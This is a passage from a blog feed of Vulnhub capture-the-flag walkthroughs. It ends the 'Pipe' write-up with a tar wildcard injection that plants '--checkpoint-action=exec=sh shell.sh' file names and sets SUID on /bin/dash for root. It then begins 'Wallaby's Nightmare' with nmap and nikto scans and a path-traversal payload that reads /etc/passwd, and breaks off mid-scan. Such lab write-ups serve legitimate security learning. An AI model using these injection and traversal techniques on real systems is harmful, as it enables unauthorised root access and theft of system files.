&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--checkpoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--checkpoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--checkpoint-action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sh&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;shell.sh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&amp;lt;ckup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--checkpoint-action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sh&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;shell.sh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                         
www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'chmod u+s /bin/dash'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.sh
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'chmod u+s /bin/dash'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.sh
www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'touch /home/rene/backup/done'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; shell.sh
&amp;lt;ckup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'touch /home/rene/backup/done'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; shell.sh                       
www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;shell.sh
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;shell.sh
chmod u+s /bin/dash
touch /home/rene/backup/done
www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;chmod +x shell.sh
chmod +x shell.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And now we only have to wait for a file called &lt;b&gt;done&lt;/b&gt;. After few minutes it appeared. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 124
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data      1 Jul 30 07:05 &lt;span class=&quot;nt&quot;&gt;--checkpoint-action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sh shell.sh
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data      1 Jul 30 07:05 &lt;span class=&quot;nt&quot;&gt;--checkpoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
drwxrwxrwx 2 rene     rene       4096 Jul 30 07:10 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 rene     rene       4096 Jul  6  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene     rene     104106 Jul 30 07:10 backup.tar.gz
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root     root          0 Jul 30 07:10 &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 www-data www-data     49 Jul 30 07:05 shell.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;By launching &lt;b&gt;dash&lt;/b&gt; shell, we are privilaged with root access.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/bin/dash
/bin/dash
&lt;span class=&quot;c&quot;&gt;# id&lt;/span&gt;
id
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
whoami
root&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's look for final flag. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# ls -la /root&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /root
total 28
drwx------  2 root root 4096 Jul  9  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 22 root root 4096 Jul  5  2015 ..
lrwxrwxrwx  1 root root    9 Jul  5  2015 .bash_history -&amp;gt; /dev/null
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  570 Jan 31  2010 .bashrc
lrwxrwxrwx  1 root root    9 Jul  9  2015 .nano_history -&amp;gt; /dev/null
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  140 Nov 20  2007 .profile
&lt;span class=&quot;nt&quot;&gt;-rwx------&lt;/span&gt;  1 root root  120 Jul  6  2015 create_backup.sh
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root 4251 Jul  6  2015 flag.txt
&lt;span class=&quot;c&quot;&gt;# cat /root/flag.txt&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/flag.txt
                                                                   .aMMMMMMMMn.  ,aMMMMn.
                                                                 .aMccccccccc&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;YMMn.    &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;Mb
                                                                aMccccccccccccccc&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Mn    MP
                                                               .AMMMMn.   MM &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;YMMY&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;ccaM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
                                                              dM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;YMMb  YP        &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;cMY
                                                              YM.  .dMMP   aMn.     .cMP
                                                               &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;YMMn.     aMMMMMMMMMMMY&lt;span class=&quot;s1&quot;&gt;'
                                                                .'&lt;/span&gt;YMMb.           ccMP
                                                             .dMcccccc&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Mc....cMb.cMP&lt;span class=&quot;s1&quot;&gt;'
                                                           .dMMMMb;cccc*Mbcccc,IMMMMMMMn.
                                                          dY*'&lt;/span&gt;  &lt;span class=&quot;s1&quot;&gt;'*M;ccccMM..dMMM..MP*cc*Mb
                                                          YM.    ,MbccMMMMMMMMMMMM*cccc;MP
                                                           *Mbn;adMMMMMMMMMMMMMMMIcccc;M*
                                                          dPcccccIMMMMMMMMMMMMMMMMa;c;MP
                                                          Yb;cc;dMMMMMMMMMMMP*'&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;YMMP&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
                                                           &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;YMMMPYMMMMMMP&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'          curchack
                                                       +####################################+
                                                       |======                            | |
                                                       |======                            | |
                                                       |======                            | |
                                                       |======                            | |
                                                       |======                            | |
                                                       +----------------------------------+-+
                                                        ####################################
                                                             |======                  |
                                                             |======                  |
                                                             |=====                   |
                                                             |====                    |
                                                             |                        |
                                                             +                        +

 .d8888b.                 d8b          d8b               888                                                                    d8b
d88P  Y88b                Y8P          88P               888                                                                    Y8P
888    888                             8P                888
888        .d88b.  .d8888b888   88888b.&quot;  .d88b. .d8888b 888888   88888b.  8888b. .d8888b    888  88888888b.  .d88b.    88888b. 88888888b.  .d88b.
888       d8P  Y8bd88P&quot;   888   888 &quot;88b d8P  Y8b88K     888      888 &quot;88b    &quot;88b88K        888  888888 &quot;88bd8P  Y8b   888 &quot;88b888888 &quot;88bd8P  Y8b
888    88888888888888     888   888  888 88888888&quot;Y8888b.888      888  888.d888888&quot;Y8888b.   888  888888  88888888888   888  888888888  88888888888
Y88b  d88PY8b.    Y88b.   888   888  888 Y8b.         X88Y88b.    888 d88P888  888     X88   Y88b 888888  888Y8b.       888 d88P888888 d88PY8b.   d8b
 &quot;Y8888P&quot;  &quot;Y8888  &quot;Y8888P888   888  888  &quot;Y8888  88888P'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Y888   88888P&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Y888888 88888P'    &quot;&lt;/span&gt;Y88888888  888 &lt;span class=&quot;s2&quot;&gt;&quot;Y8888    88888P&quot;&lt;/span&gt; 88888888P&lt;span class=&quot;s2&quot;&gt;&quot;  &quot;&lt;/span&gt;Y8888Y8P
                                                                  888                                                   888        888
                                                                  888                                                   888        888
                                                                  888                                                   888        888
Well Done!
Here&lt;span class=&quot;s1&quot;&gt;'s your flag: 0089cd4f9ae79402cdd4e7b8931892b7&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And here it is! &lt;/p&gt;
</description>
        <pubDate>Mon, 31 Jul 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub-pipe/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-pipe/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - Wallaby's: Nightmare</title>
        <description>&lt;p&gt;Today we're going to play with another machine called &lt;b&gt;Wallaby's: Nightmare&lt;/b&gt;. Here's the description: &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;This is my first CTF/Vulnerable VM ever. I created it both for educational purposes and so people can have a little fun testing their skills in a legal, pentest lab environment.

Some notes before you download!

    Try to use a Host-Only Adapter. This is an intentionally vulnerable machine and leaving it open on your network can have bad results.
    It should work with Vmware flawlessly. I've tested it with vbox and had one other friend test it on Vbox as well so I think it should work just fine on anything else.

This is a Boot2Root machine. The goal is for you to attempt to attempt to gain root privileges in the VM. Do not try to get the root flag through a recovery iso etc, this is essentially cheating! The idea is to get through by pretending this machine is being attacked over a network with no physical access.

I themed this machine to make it feel a bit more realistic. You are breaking into a fictional characters server (named Wallaby) and trying to gain root without him noticing, or else the difficulty level will increase if you make the wrong move! Good luck and I hope you guys enjoy!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1&gt;Challenge&lt;/h1&gt;

&lt;p&gt;As always, we're going to start from finding an IP address of the machine using nmap. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap 192.168.56.102/24

Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-07-15 08:14 EDT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.1
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000062s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
All 1000 scanned ports on 192.168.56.1 are closed
MAC Address: 0A:00:27:00:00:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.100
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00011s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
All 1000 scanned ports on 192.168.56.100 are filtered
MAC Address: 08:00:27:29:FD:0E &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00056s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 997 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
6667/tcp filtered irc
MAC Address: 08:00:27:BC:E8:C6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.102
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0000050s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
All 1000 scanned ports on 192.168.56.102 are closed

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 256 IP addresses &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4 hosts up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;6.10 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can start the fun from looking at the http port, there's always something interesting in the website. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/wallabys-nightmare/first-look.png&quot; alt=&quot;First Look&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hmmm, prompt asking us for a username. Let's enter something and see what happens. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/wallabys-nightmare/website-inside.png&quot; alt=&quot;Website - the inside&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see it's a simple introducion to the ctf. As a standart part of checking everything, I have found XSS in the form, but it won't help us for now. We can start digging further by clicking on &lt;b&gt;start the ctf&lt;/b&gt; link, which moves us to a new page. And what is good for us, is that it uses the GET parameter to display the file.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://192.168.56.101/?page=home&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Maybe it's vulnerable to Local File Intrusion? Let's check this by trying to get the content of &lt;b&gt;/etc/passwd&lt;/b&gt; file. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://192.168.56.101/?page=../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
walfin:x:1000:1000:walfin,,,:/home/walfin:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
steven?:x:1001:1001::/home/steven?:/bin/bash
ircd:x:1003:1003:,,,:/home/ircd:/bin/bash&lt;span class=&quot;c&quot;&gt;&amp;lt;!--This is what we call 'dis-information' in the cyber security world!  Are you learning anything new here bobby
?--&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, we have the &lt;b&gt;/etc/passwd&lt;/b&gt; file. But after trying to grab &lt;b&gt;/etc/shadow&lt;/b&gt;, website presented us with this nice info and connection was dropped. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;view-source:http://192.168.56.101/?page=../../../etc/shadow
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;That's some fishy stuff you're trying there &lt;span class=&quot;nt&quot;&gt;&amp;lt;em&amp;gt;&lt;/span&gt;bobby
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/em&amp;gt;&lt;/span&gt;buddy.  You must think Wallaby codes like a monkey!  I better get to securing this SQLi though...&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;(Wallaby caught you trying an LFI, you gotta be sneakier!  Difficulty level has increased.)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Doing the nmap scan showed us that the port 80 is no longer there. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap 192.168.56.101

Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-07-15 08:21 EDT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00019s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
6667/tcp filtered irc
MAC Address: 08:00:27:BC:E8:C6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.46 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But another scan, with bigger port range, showed new http service, running on port &lt;b&gt;60080&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 192.168.56.101

Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-07-15 08:22 EDT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0055s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65532 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
6667/tcp  filtered irc
60080/tcp open     unknown
MAC Address: 08:00:27:BC:E8:C6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;5.15 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another website! &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/wallabys-nightmare/another-website.png&quot; alt=&quot;Port 60080 website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Unfortunately there were no clues in the image, as I thought at first. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://192.168.56.101:60080/sec.png

root@kali:~/Downloads# exiftool index.png
ExifTool Version Number         : 10.40
File Name                       : index.png
Directory                       : &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
File Size                       : 56 kB
File Modification Date/Time     : 2017:07:15 08:24:56-04:00
File Access Date/Time           : 2017:07:15 08:25:17-04:00
File Inode Change Date/Time     : 2017:07:15 08:24:56-04:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 600
Image Height                    : 400
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Software                        : Adobe ImageReady
XMP Toolkit                     : Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00
Creator Tool                    : Adobe Photoshop CS5 Windows
Instance ID                     : xmp.iid:04130E655CDC11E08DFECD5B48C7E53A
Document ID                     : xmp.did:04130E665CDC11E08DFECD5B48C7E53A
Derived From Instance ID        : xmp.iid:04130E635CDC11E08DFECD5B48C7E53A
Derived From Document ID        : xmp.did:04130E645CDC11E08DFECD5B48C7E53A
Image Size                      : 600x400
Megapixels                      : 0.240&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If you don't know what to do, do a Nikto scan! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 192.168.56.101:60080
- Nikto v2.1.6
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Target IP:          192.168.56.101
+ Target Hostname:    192.168.56.101
+ Target Port:        60080
+ Start Time:         2017-07-15 08:28:56 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Server: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Web Server returns a valid response with junk HTTP methods, this may cause &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positives.
